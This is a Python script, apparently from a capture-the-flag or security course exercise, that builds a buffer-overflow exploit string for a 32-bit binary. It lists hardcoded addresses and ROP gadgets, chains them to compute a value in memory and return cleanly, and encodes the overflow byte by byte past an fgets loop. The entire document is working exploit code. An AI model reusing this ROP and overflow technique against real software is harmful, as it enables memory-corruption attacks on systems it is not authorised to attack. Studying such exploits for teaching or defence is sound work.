############################################ IMPORTANT ADDRESSES ############################################

padding = '\x00\x50\x0e\x08'  # 0x080e5000

main_ret = '\xba\x9e\x04\x08' # 0x08049eb7
glb_address= '\xc0\x6c\x0e\x08' # 0x080e6cc0
exit_address='\xf0\x07\x05\x08' # 0x080507f0
safe_address='\x00\x50\x0e\x08\x08\xd0\xff\xff'
plain_text= '\xe0\x6c\x0e\x08' # '0x080e6ce0'
ebx_old_vl= '\x00\x50\x0e\x08' # '0x080e5000'

temp_var1 = '\xd4\x6c\x0e\x08'
temp_var2 = '\xd8\x6c\x0e\x08'
################################################## GADGETS ##################################################

# 0x08098d00 : mov eax, 1 ; ret
mov_eax_1 = '\x00\x8d\x09\x08'

# 0x08098d10 : mov eax, 2 ; ret
mov_eax_2 = '\x10\x8d\x09\x08'

# 0x08098d20 : mov eax, 3 ; ret
mov_eax_3 = '\x20\x8d\x09\x08'

# 0x08098d30 : mov eax, 4 ; ret
mov_eax_4 = '\x30\x8d\x09\x08'

# 0x08098d40 : mov eax, 5 ; ret
mov_eax_5 = '\x40\x8d\x09\x08'

# 0x08098d50 : mov eax, 6 ; ret
mov_eax_6 = '\x50\x8d\x09\x08'

# 0x08088b4d : mov dword ptr [ecx], eax ; pop ebx ; ret
mov_dw_ecx_eax = '\x4d\x8b\x08\x08'

# 0x0806b2d8 : imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
imul_dw_ecx = '\xd8\xb2\x06\x08'

# 0x080640c1 : pop ecx ; add al, 0xf6 ; ret
pop_ecx = '\xc1\x40\x06\x08'

# 0x08049859 : pop ebp ; ret
pop_ebp = '\x59\x98\x04\x08'

# '0x080b054a' : pop eax ; ret
pop_eax = '\x4a\x05\x0b\x08'


############################################### GADGETS CHAIN ###############################################

gadget_chain  = pop_ecx   + glb_address
gadget_chain += mov_eax_6 + mov_dw_ecx_eax + padding
gadget_chain += mov_eax_5 + imul_dw_ecx   +  padding + mov_dw_ecx_eax + padding
gadget_chain += mov_eax_4 + imul_dw_ecx   +  padding + mov_dw_ecx_eax + padding 
gadget_chain += mov_eax_3 + imul_dw_ecx   +  padding + mov_dw_ecx_eax + padding
gadget_chain += mov_eax_2 + imul_dw_ecx   +  padding + mov_dw_ecx_eax + padding
gadget_chain += mov_eax_1

###### SAFE EXIT PART ###########################
gadget_chain += pop_ecx + temp_var1 + pop_eax + exit_address + mov_dw_ecx_eax + ebx_old_vl
gadget_chain += pop_ecx + temp_var2 + pop_eax + temp_var2 + mov_dw_ecx_eax + ebx_old_vl
gadget_chain += pop_ebp + plain_text

gadget_chain += main_ret




############################################## BUFFER OVERFLOW ##############################################

# this function takes each hexa address byte by byte and overflow fgets for first byte and makes the loop infinite and atlast makes the incrementor value 9, so it will stop the loop
def changeFormat(s):
	ans=""
	l=len(s)
	for i in range(0,l-1,1):
		ans+=s[i:i+1]+"B"*11+"\x01\n"
	ans+=s[l-1:l]+"B"*11+"\x09\x00\x00\x00"
	return ans

overflow_till_ebp = "hello\n"+("A"*12+"\x01\n")*16

exploit_string = overflow_till_ebp+changeFormat(safe_address+gadget_chain)

############################################## EXPLOIT STRING ###############################################

print(exploit_string)
